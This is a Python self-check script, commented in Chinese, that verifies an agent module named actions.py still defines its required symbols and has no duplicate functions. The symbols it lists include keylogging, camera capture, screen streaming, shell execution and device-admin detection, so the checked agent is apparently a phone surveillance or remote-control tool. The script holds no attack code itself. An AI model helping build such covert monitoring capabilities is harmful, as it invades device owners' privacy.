#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""actions.py 结构自检：真机层必需符号是否都在（防重放/补丁把某段剪掉）。"""
import io
import os
import re
import sys

sys.path.insert(0, r'agent')
os.chdir(r'agent')
import actions

REQUIRED = [
    # 执行层
    '_real_exec', '_real_data', '_real_control', '_real_app',
    # shell / 按键 / 唤醒
    '_SYSBIN', '_sh', '_child_env', '_KEYCODE', '_ensure_awake', '_screen_on',
    # 屏幕 / 编码
    'real_screen_b64', '_png_b64', '_png_rows_to_png', '_tree_zip',
    # 控件树
    '_LAST_TREE', '_foreground_pkg', '_ui_nodes_fast', '_ui_text_refresh', '_ui_dump_nodes',
    # 设备信息
    '_DEV_CACHE', '_prop_of', 'device_info_real', '_prop', '_brand', '_model',
    # 相机
    '_CAM', '_newest_photo', '_file_b64', '_camera_foreground', 'cam_frame',
    # 键盘记录
    '_KEYLOG', '_KEYLOG_SEEN', 'keylog_frame',
    # 桥 / 设备管理员 / 包解析
    'BRIDGE_ADDR', 'bridge', 'bridge_alive', '_APP_ACTS', '_resolve_pkg',
    '_find_admin_receiver', '_admin_active',
    # 投屏开关
    '_STREAM', '_STREAM_START', '_STREAM_STOP',
    # 采集
    '_content_rows',
]

missing = [n for n in REQUIRED if not hasattr(actions, n)]
print('必需符号：%d 个，缺 %d 个' % (len(REQUIRED), len(missing)))
for n in missing:
    print('  !! 缺', n)

# refagent.py 用到的 actions 属性
src = io.open('refagent.py', encoding='utf-8').read()
used = set(re.findall(r'actions\.([A-Za-z_][A-Za-z0-9_]*)', src))
used |= set(re.findall(r'_a\.([A-Za-z_][A-Za-z0-9_]*)', src))
bad = sorted(n for n in used if not hasattr(actions, n))
print('refagent.py 引用 %d 个 actions 属性，缺 %d 个：%s' % (len(used), len(bad), bad))

# 重复定义检查（重放最容易留下的痕迹）
asrc = io.open('actions.py', encoding='utf-8').read()
names = re.findall(r'^def ([A-Za-z_][A-Za-z0-9_]*)\(', asrc, re.M)
dup = sorted({k for k in names if names.count(k) > 1})
print('actions.py 顶层函数 %d 个，重复定义：%s' % (len(names), dup or '无'))
sys.exit(1 if (missing or bad or dup) else 0)
